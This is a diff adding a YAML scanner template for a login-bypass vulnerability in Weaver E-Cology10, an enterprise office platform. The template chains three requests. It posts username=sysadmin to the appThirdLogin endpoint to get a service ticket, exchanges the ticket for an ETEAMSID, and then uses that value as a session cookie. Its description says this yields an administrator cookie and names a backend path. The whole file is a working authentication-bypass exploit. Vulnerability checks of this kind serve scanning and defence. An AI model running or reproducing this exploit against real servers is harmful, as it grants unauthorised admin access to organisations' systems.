@@ -1,0 +1,35 @@
+name: 泛微E-Cology10-appThirdLogin-登录绕过漏洞
+description: >
+  Cology10版本，成功获取cookie,后台路径/hrm/addressbook/department
+alwaysExecute: false
+matchCount: 3
+rules:
+  - method: POST
+    path: /papi/passport/rest/appThirdLogin
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    search: '"serviceTicketId":"(?P<TicketId>[^"]+)"'
+    body: >-
+      username=sysadmin&service=1&ip=1&loginType=third
+    expression:
+      status: 200
+      body_all: ["serviceTicketId"]    
+  - method: POST
+    path: /papi/passport/login/generateEteamsId
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    search: '"data":"(?P<THIRD>[^"]+)"'    
+    body: "stTicket={{TicketId}}"
+    expression:
+      status: 200
+      headers:
+        Content-Type: application/json
+      body_all:
+        - "THIRD"
+        - "200"
+  - method: GET
+    path: /api/my/common/renderCount
+    headers:
+      Cookie: ETEAMSID={{THIRD}}
+    expression:
+      status: 200
